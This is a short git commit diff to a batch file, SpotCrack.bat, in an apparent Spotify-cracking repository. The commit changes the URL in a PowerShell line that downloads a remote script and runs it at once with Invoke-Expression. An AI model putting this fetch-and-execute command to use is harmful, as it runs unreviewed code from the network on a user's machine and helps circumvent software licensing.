ff21e837a37d24329f95215e98a9dd927594dae0
Minixsas <70332219+Minixsas@users.noreply.github.com>
2022-03-07 16:13:02 +0100

    Update SpotCrack.bat

--- SpotifyCrack-minixsas/SpotCrack.bat
+++ SpotifyCrack-minixsas/SpotCrack.bat
@@ -1,4 +1,4 @@
 @echo off
-powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/InkyScud/SpotCrack/main/SpotCrack' | Invoke-Expression}"
+powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/Minixsas/Spotifypremium/main/SpotifyCrack-minixsas/SpotCrack' | Invoke-Expression}"
 pause
 exit
